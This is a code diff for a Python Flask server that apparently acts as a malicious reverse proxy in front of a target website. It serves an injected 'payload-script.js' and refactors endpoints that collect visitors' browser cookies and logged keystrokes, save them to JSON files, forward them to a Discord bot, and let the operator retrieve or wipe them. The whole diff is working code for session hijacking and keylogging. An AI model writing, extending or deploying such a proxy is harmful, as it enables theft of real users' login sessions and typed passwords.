@@ -72,7 +72,13 @@ def start_proxy(target, host, port, secret):
 
     @app.route('/ep/api/cookies', methods=['GET', 'POST'])
     def handle_cookies():
-        if request.method == 'POST':
+        if request.method == 'GET':
+            try:
+                with open('cookies.json', 'r') as f:
+                    return jsonify(json.load(f))
+            except:
+                return jsonify([])
+        else:  # POST
             data = request.json
             try:
                 with open('cookies.json', 'r+') as f:
@@ -81,20 +87,19 @@ def start_proxy(target, host, port, secret):
                     except:
                         cookies = []
                     
-                    # Add new cookies
                     if 'cookies' in data:
                         for cookie in data['cookies']:
                             cookie_entry = {
                                 'name': cookie['name'],
                                 'value': cookie['value'],
                                 'domain': cookie['domain'],
+                                'path': cookie['path'],
                                 'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                 'url': data.get('url', ''),
                                 'userAgent': data.get('userAgent', '')
                             }
                             cookies.append(cookie_entry)
                     
-                    # Save back to file
                     f.seek(0)
                     json.dump(cookies, f)
                     f.truncate()
@@ -106,16 +111,53 @@ def start_proxy(target, host, port, secret):
             except Exception as e:
                 print(f"{Fore.RED}[!] Error saving cookies: {str(e)}{Fore.RESET}")
                 return jsonify({'status': 'error', 'message': str(e)}), 500
-        else:
+
+    @app.route('/ep/api/keylog', methods=['GET', 'POST'])
+    def handle_keylog():
+        if request.method == 'GET':
             try:
-                with open('cookies.json', 'r') as f:
+                with open('keylogs.json', 'r') as f:
                     return jsonify(json.load(f))
             except:
                 return jsonify([])
+        else:  # POST
+            data = request.json
+            try:
+                with open('keylogs.json', 'r+') as f:
+                    try:
+                        logs = json.load(f)
+                    except:
+                        logs = []
+                    
+                    log_entry = {
+                        'keys': data.get('keys', ''),
+                        'url': data.get('url', ''),
+                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                    }
+                    logs.append(log_entry)
+                    
+                    f.seek(0)
+                    json.dump(logs, f)
+                    f.truncate()
 
-    @app.route('/ep/api/clearCookies', methods=['POST'])
-    def clear_cookies():
-        with open('cookies.json', 'w') as f:
+                if discord_bot:
+                    discord_bot.send_keylog(data)
+                
+                return jsonify({'status': 'success'})
+            except Exception as e:
+                print(f"{Fore.RED}[!] Error saving keylog: {str(e)}{Fore.RESET}")
+                return jsonify({'status': 'error', 'message': str(e)}), 500
+
+    @app.route('/ep/api/clear/<type>', methods=['POST'])
+    def clear_data(type):
+        if type == 'cookies':
+            filename = 'cookies.json'
+        elif type == 'keylog':
+            filename = 'keylogs.json'
+        else:
+            return jsonify({'status': 'error', 'message': 'Invalid type'}), 400
+
+        with open(filename, 'w') as f:
             json.dump([], f)
         return jsonify({'status': 'success'})
 
@@ -147,103 +189,9 @@ def start_proxy(target, host, port, secret):
             discord_bot.send_browser_info(data)
         return jsonify({'status': 'success'})
 
-    @app.route('/ep/api/keylog', methods=['POST'])
-    def handle_keylog():
-        data = request.json
-        try:
-            with open('keylogs.json', 'r+') as f:
-                try:
-                    logs = json.load(f)
-                except:
-                    logs = []
-                
-                log_entry = {
-                    'keys': data.get('keys', ''),
-                    'url': data.get('url', ''),
-                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                }
-                logs.append(log_entry)
-                
-                f.seek(0)
-                json.dump(logs, f)
-                f.truncate()
-
-            if discord_bot:
-                discord_bot.send_keylog(data)
-            
-            return jsonify({'status': 'success'})
-        except Exception as e:
-            print(f"{Fore.RED}[!] Error saving keylog: {str(e)}{Fore.RESET}")
-            return jsonify({'status': 'error', 'message': str(e)}), 500
-
-    @app.route('/ep/api/getKeylog', methods=['GET'])
-    def get_keylog():
-        try:
-            with open('keylogs.json', 'r') as f:
-                return jsonify(json.load(f))
-        except:
-            return jsonify([])
-
-    @app.route('/ep/api/getCookies', methods=['GET'])
-    def get_cookies():
-        try:
-            with open('cookies.json', 'r') as f:
-                return jsonify(json.load(f))
-        except:
-            return jsonify([])
-
-    @app.route('/ep/api/serverInfo', methods=['GET'])
-    def get_server_info():
-        return jsonify({
-            'target': target,
-            'host': host,
-            'port': port
-        })
-
     @app.route('/payload-script.js')
     def serve_payload():
         return send_from_directory('proxy', 'payload-script.js', mimetype='application/javascript')
-
-    @app.route('/ep/api/cookies', methods=['POST'])
-    def handle_cookies():
-        data = request.json
-        try:
-            with open('cookies.json', 'r+') as f:
-                try:
-                    cookies = json.load(f)
-                except:
-                    cookies = []
-                
-                if 'cookies' in data:
-                    for cookie in data['cookies']:
-                        cookie_entry = {
-                            'name': cookie['name'],
-                            'value': cookie['value'],
-                            'domain': cookie['domain'],
-                            'path': cookie['path'],
-                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-                            'url': data.get('url', ''),
-                            'userAgent': data.get('userAgent', '')
-                        }
-                        cookies.append(cookie_entry)
-                
-                f.seek(0)
-                json.dump(cookies, f)
-                f.truncate()
-
-            if discord_bot:
-                discord_bot.send_cookies(data)
-            
-            return jsonify({'status': 'success'})
-        except Exception as e:
-            print(f"{Fore.RED}[!] Error saving cookies: {str(e)}{Fore.RESET}")
-            return jsonify({'status': 'error', 'message': str(e)}), 500
-
-    @app.route('/ep/api/clearKeylog', methods=['POST'])
-    def clear_keylog():
-        with open('keylogs.json', 'w') as f:
-            json.dump([], f)
-        return jsonify({'status': 'success'})
 
     @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
